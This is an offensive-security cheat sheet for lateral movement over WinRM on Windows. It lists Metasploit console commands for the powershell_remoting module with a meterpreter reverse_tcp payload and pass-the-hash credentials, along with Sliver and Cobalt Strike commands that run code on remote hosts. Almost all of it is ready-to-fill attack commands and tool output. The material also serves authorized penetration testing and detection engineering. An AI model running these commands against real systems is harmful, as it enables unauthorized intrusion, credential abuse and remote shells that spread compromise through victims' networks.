---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - T1021-006
  - network-protocols
  - winrm
  - metasploit-framework
  - sliver
  - cobalt-strike
  - windows
---
# C2 Frameworks

## 01 - Metasploit

```
msf > use exploit/windows/local/powershell_remoting

msf exploit(windows/local/powershell_remoting) > options

Module options (exploit/windows/local/powershell_remoting):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   ExitOnSession        false            yes       Return from the exploit after a session has been created
   HOSTFILE                              no        Line separated file with hostnames to target
   RHOSTS                                no        Target address range or CIDR identifier
   ReverseListenerComm                   no        The specific communication channel to use for this listener
   SESSION                               yes       The session to run this module on
   SMBDomain                             no        The Windows domain to use for authentication
   SMBPass                               no        The password for the specified username
   SMBUser                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/local/powershell_remoting) > set session <session_ID>

msf exploit(windows/local/powershell_remoting) > set exitonsession <true | false>

msf exploit(windows/local/powershell_remoting) > set rhosts <IP>

msf exploit(windows/local/powershell_remoting) > set hostfile /local/path/to/ip_targets.txt

msf exploit(windows/local/powershell_remoting) > set smbdomain <domain>

msf exploit(windows/local/powershell_remoting) > set smbuser <username>

msf exploit(windows/local/powershell_remoting) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf exploit(windows/local/powershell_remoting) > run
```

## 02 - Sliver

```
sliver (IMPLANT_NAME) > winrm <IP> <command> <domain>\\<username> <password>
```

## 03 - Cobalt Strike

### 3.1 - `jump`

```
beacon> jump <winrm | winrm64> <IP> <listener>
```

### 3.2 - `remote-exec`

```
beacon> remote-exec winrm <IP> <cmdlets>
```